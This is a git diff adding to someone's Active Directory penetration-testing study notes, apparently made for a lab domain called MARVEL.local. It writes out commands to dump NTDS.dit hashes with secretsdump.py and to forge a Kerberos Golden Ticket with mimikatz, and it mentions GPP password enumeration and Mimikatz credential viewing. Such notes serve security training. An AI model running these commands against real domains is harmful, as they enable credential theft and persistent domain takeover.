@@ -462,7 +462,7 @@ I recommend using this script to build the AD environment. This ensures that the
   ```
 
   - Or if we have credentials: use metasploit smb_enum_gpp module
-
+  
 * Mimikatz:
 
   - If there is a share connected to a machine, might be possible to view the password in clear text using this tool
@@ -484,3 +484,38 @@ I recommend using this script to build the AD environment. This ensures that the
 - PrintNightmare
 
 ## Post-Domain Compromise Attack Strategy
+
+* Dumping the NTDS.dit:
+
+```shell
+  #with a known domain admin
+  secretsdump.py MARVEL.local/hawkeye:'Password1@'@dc.ip -just-dc-ntlm
+
+  #we can use Excel's Text-to-Columns feature to split data
+  #machines are not really high-value targets
+  ```
+
+- Golden Ticket Attacks:
+
+```shell
+  #on the domain controller with admin cmd
+  mimikatz.exe
+
+  privilege::debug
+
+  lsadump::lsa /inject /name:krbtgt
+  #we need the User's SID and NTLM hash
+
+  #User doesnt really matter
+  kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21... /krbtgt:NTML_hash /id:500 /ptt
+
+  misc::cmd
+  ```
+
+- Silver Ticket Attacks:
+
+## AD Case Studies:
+
+  - https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security
+  - https://tcm-sec.com/pentest-tales-002-digging-deep
+  - Enumerate, look through all the shares, sometimes all it takes is a too permissive account or a document with a password in it
